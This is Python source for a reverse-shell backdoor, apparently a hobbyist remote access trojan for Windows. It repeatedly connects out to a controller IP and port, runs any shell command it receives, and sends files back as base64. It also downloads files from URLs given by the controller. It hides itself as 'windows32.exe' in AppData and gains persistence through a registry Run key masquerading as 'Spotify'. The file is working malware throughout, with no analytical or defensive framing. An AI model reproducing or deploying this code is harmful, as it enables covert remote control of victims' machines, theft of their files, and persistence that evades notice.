#!/usr/bin/python

import socket
import subprocess
import json
import os
import base64
import shutil
import sys
import time
import requests

#Sends data to server using json library
def reliable_send(data):
        json_data =json.dumps(data)
        sock.send(json_data)

#Waits to receive commands from server using the socket
def reliable_recv():
        data = ""
        while True:
                try:
                        data = data + sock.recv(1024)
                        return json.loads(data)
                        
                except ValueError:
                        continue

#Downloads file from target computer by writing a copy of it on local machine			
def download(url):
	get_response= requests.get(url)
	file_name= url.split("/")[-1]
	with open(file_name, "wb") as out_file:
		out_file.write(get_response.content)
		
#Attempts to connect to host server every 20 seconds upon start-up. Allows for Reverse Shell to not crash even if server is not running first.
def connection():
	while True:
		time.sleep(20)
		try:
			sock.connect(("192.168.0.81", 54321)) #Customize IP and port here
			shell()
		except:
			continue

#Allows for sending and receiving of commands from server. Checks Special cases for downloading and uploading files locally,
#uploading a file from the internet, and moving about Windows directories, by checking if command starts with certain keyword.

def shell():
        while True:
                command = reliable_recv()
                if command == 'q':
                        break
                elif command[:2] == "cd" and len(command) > 1:
                        try:
                                os.chdir(command[3:])
                        except:
                                continue
                elif command[:8]== "download":
                        with open(command[9:],"rb") as file:
                                reliable_send(base64.b64encode(file.read()))
                elif command[:6] == "upload":
                        with open(command[7:], "wb") as fin:
                                file_data = reliable_recv()
                                fin.write(base64.b64decode(file_data))

		elif command[:3]=="get":
			try:
				download(command[4:])
				reliable_send("[+] Downloaded File From Specified URL!")
			except:
				reliable_send("[-] Failed to Download that File")
                else:
                        proc = subprocess.Popen(command, shell=True, stdout= subprocess.PIPE, stderr=subprocess.PIPE, stdin= subprocess.PIPE)
                        result = proc.stdout.read() + proc.stderr.read()
                        reliable_send(result)

#Attempts to create a copy of the file that runs on start-up, which is hidden as a windows32 executable
location= os.environ["appdata"] + "\\windows32.exe"
if not os.path.exists(location):
	shutil.copyfile(sys.executable, location)
	subprocess.call(


	'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Spotify /t REG_SZ /d "' + location + '"', shell=True)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#sock.connect(("192.168.0.81", 54321))
connection()

sock.close()
